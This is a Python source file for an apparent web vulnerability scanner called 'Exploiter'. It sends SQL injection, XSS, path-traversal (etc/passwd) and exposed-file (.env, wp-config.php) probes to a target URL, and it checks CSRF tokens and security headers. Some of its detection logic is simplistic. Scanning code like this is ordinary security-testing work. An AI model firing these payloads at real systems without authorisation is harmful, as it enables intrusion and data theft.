import requests
import re
import os
import time
from bs4 import BeautifulSoup
from tqdm import tqdm
import threading

class Session:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Abliteration-Scanner/2.0'
        })

    def request(self, url, method='GET', data=None, json=None):
        try:
            if method.upper() == 'GET':
                return self.session.get(url, timeout=10)
            elif method.upper() == 'POST':
                return self.session.post(url, data=data, json=json, timeout=10)
        except Exception as e:
            print(f"[!] Request Error: {e}")
            return None

    def get_content_length(self, url):
        try:
            resp = self.session.head(url, timeout=5)
            return str(resp.status_code), resp.headers.get('Content-Length'), resp.headers
        except Exception:
            return None, None, {}

    def fetch(self, url):
        resp = self.request(url)
        if resp is not None:
            return resp.status_code, resp.text, resp.headers
        return None, None, {}

class Colors:
    R = '\033[1;31m'; G = '\033[1;32m'; Y = '\033[1;33m'; B = '\033[1;34m'
    M = '\033[1;35m'; C = '\033[1;36m'; W = '\033[1;37m'
    BOLD = '\033[1m'; EN = '\033[0m'

class Exploiter:
    def __init__(self, target_url):
        self.url = target_url
        self.session = Session()
        self.results = {}

    # SQL Injection (Boolean & Time Based detection)
    def test_sqli(self):
        print(f"{Colors.B}[+] SQLi Advanced Check...{Colors.EN}")
        payloads = [
            "1' AND '1'='1",
            "1' AND SLEEP(2)='1",
            "1' OR '1'='1",
            "test' OR '1'='1"
        ]
        for pl in payloads:
            sep = '&' if '?' in self.url else '?'
            url = f"{self.url}{sep}id={pl}"
            start = time.time()
            _code, _txt, _headers = self.session.fetch(url)
            end = time.time()
            if _txt and ('mysql' in _txt.lower() or 'sql syntax' in _txt.lower()):
                print(f"{Colors.R}    ⚠️ Boolean Based SQLi: {pl}{Colors.EN}")
                self.results['SQL Injection'] = f"Detected (Payload: {pl})"
                return
            if end - start >= 1.8:
                print(f"{Colors.R}    ⚠️ Time Based SQLi Detected{Colors.EN}")
                self.results['SQL Injection'] = "Detected (Time Delay)"
                return
        self.results['SQL Injection'] = "Safe"

    # XSS (Check Stored & Reflected)
    def test_xss(self):
        print(f"{Colors.B}[+] XSS Advanced Check...{Colors.EN}")
        payload = '<svg/onload=alert(1)>'
        sep = '&' if '?' in self.url else '?'
        url = f"{self.url}{sep}search={payload}"
        _code, _txt, _headers = self.session.fetch(url)
        if _txt and payload in _txt:
            print(f"{Colors.R}    ⚠️ Reflected XSS Detected{Colors.EN}")
            self.results['XSS'] = "Detected (Reflected)"
        else:
            # Check via POST (Stored candidate check)
            if 'login' in self.url.lower() or 'comment' in self.url.lower():
                resp = self.session.request(self.url, method='POST', data={'comment': payload})
                if resp and payload in resp.text:
                    print(f"{Colors.R}    ⚠️ Stored XSS Detected{Colors.EN}")
                    self.results['XSS'] = "Detected (Stored)"
                else:
                    self.results['XSS'] = "Safe"
            else:
                self.results['XSS'] = "Safe"

    # IDOR & Access Control
    def test_idor(self):
        print(f"{Colors.B}[+] IDOR Check...{Colors.EN}")
        if 'id=' in self.url or 'user=' in self.url:
            parts = self.url.split('?id=')
            if len(parts) > 1:
                base = parts[0]
                url_test = f"{base}?id=999999"
                _code, _txt, _ = self.session.fetch(url_test)
                if _code and _code == 200:
                    print(f"{Colors.R}    ⚠️ IDOR Vulnerable{Colors.EN}")
                    self.results['IDOR'] = "Detected"
                else:
                    self.results['IDOR'] = "Protected"
            else:
                self.results['IDOR'] = "N/A"
        else:
            self.results['IDOR'] = "N/A"

    # CSRF Protection
    def test_csrf(self):
        print(f"{Colors.B}[+] CSRF Protection...{Colors.EN}")
        _code, _txt, _headers = self.session.fetch(self.url)
        if _txt and ('csrf' in _txt.lower() or 'token' in _txt.lower()):
            print(f"{Colors.G}    ✓ CSRF Token Found{Colors.EN}")
            self.results['CSRF'] = "Protected"
        else:
            print(f"{Colors.M}    ⚠️ No CSRF Token Found{Colors.EN}")
            self.results['CSRF'] = "Vulnerable (No Token)"

    # Path Traversal
    def test_lfi(self):
        print(f"{Colors.B}[+] Directory Listing / LFI...{Colors.EN}")
        traversal_paths = ['../', '..\\', '%2e%2e/']
        for p in traversal_paths:
            sep = '&' if '?' in self.url else '?'
            url_test = f"{self.url}{sep}file={p}etc/passwd"
            _code, _txt, _ = self.session.fetch(url_test)
            if _txt and 'root:' in _txt:
                print(f"{Colors.R}    ⚠️ Path Traversal / LFI Detected{Colors.EN}")
                self.results['LFI'] = "Detected"
                return
        self.results['LFI'] = "Safe"

    # Directory Listing (Dorking)
    def test_dorking(self):
        print(f"{Colors.B}[+] Sensitive File Exposure Check...{Colors.EN}")
        files = ['.env', '.git/config', 'backup.sql', 'wp-config.php', '.htaccess']
        base = self.url.rstrip('/')
        for f in files:
            url_test = f"{base}/{f}"
            _code, _, _ = self.session.fetch(url_test)
            if _code and _code == 200:
                print(f"{Colors.R}    ⚠️ Exposed File: {f}{Colors.EN}")
                self.results['Dorking'] = f"Files found: {f}"
                return
        self.results['Dorking'] = "Hidden"

    # Clickjacking & Headers
    def test_headers(self):
        print(f"{Colors.B}[+] Security Headers...{Colors.EN}")
        _, _, headers = self.session.fetch(self.url)
        xfo = headers.get('X-Frame-Options', '')
        csp = headers.get('Content-Security-Policy', '')
        hsts = headers.get('Strict-Transport-Security', '')
        vulns = []
        if not xfo: vulns.append("X-Frame-Options")
        if not csp: vulns.append("CSP")
        if not hsts: vulns.append("HSTS")
        if vulns:
            print(f"{Colors.M}    ⚠️ Missing Headers: {', '.join(vulns)}{Colors.EN}")
            self.results['Headers'] = f"Missing: {', '.join(vulns)}"
        else:
            print(f"{Colors.G}    ✓ Headers Complete{Colors.EN}")
            self.results['Headers'] = "Complete"
